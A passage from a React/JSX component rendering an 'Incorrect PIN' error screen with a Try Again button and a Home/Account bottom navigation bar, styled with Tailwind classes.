              <h1 className="text-[22px] sm:text-[25px] font-extrabold text-[#ff3b30] tracking-tight">
                Incorrect PIN
              </h1>

              {/* Subtitle */}
              <p className="text-white/70 text-[13px] sm:text-[14px] mt-2 max-w-[270px] mx-auto leading-relaxed">
                Your PIN is incorrect. Please check your details and try again.
              </p>

              {/* Try Again Pill Button */}
              <div className="mt-6 sm:mt-7 flex justify-center">
                <button
                  type="button"
                  onClick={resetAllFieldsAndRestart}
                  className="w-full max-w-[280px] h-[48px] sm:h-[52px] rounded-full bg-[#335c87] hover:bg-[#2b4d70] active:scale-[0.99] text-white font-bold text-[15px] sm:text-[16px] shadow-lg shadow-[#335c87]/30 transition-all cursor-pointer flex items-center justify-center"
                >
                  Try Again
                </button>
              </div>
            </div>

            {/* Bottom Navigation Bar */}
            <div className="px-5 sm:px-6 py-2.5 bg-[#32344a] border-t border-white/10 flex items-center justify-around select-none">
              {/* Home Tab - Redirects to start screen with full reset */}
              <button
                type="button"
                onClick={resetAllFieldsAndRestart}
                className="flex flex-col items-center gap-1 text-white/60 hover:text-white transition-colors cursor-pointer"
              >
                <span className="text-xl leading-none">🏠</span>
                <span className="text-[11.5px]">Home</span>
              </button>

              {/* Account Tab (Active) */}
              <div className="flex flex-col items-center gap-1 text-[#4D9EE1] cursor-pointer">
                <User className="w-5 h-5 text-[#4D9EE1] stroke-[2.2]" />
                <span className="text-[11.5px] font-semibold text-[#4D9EE1]">Account</span>
              </div>
            </div>
          </div>
        )}
      </div>
    </main>
  )
}
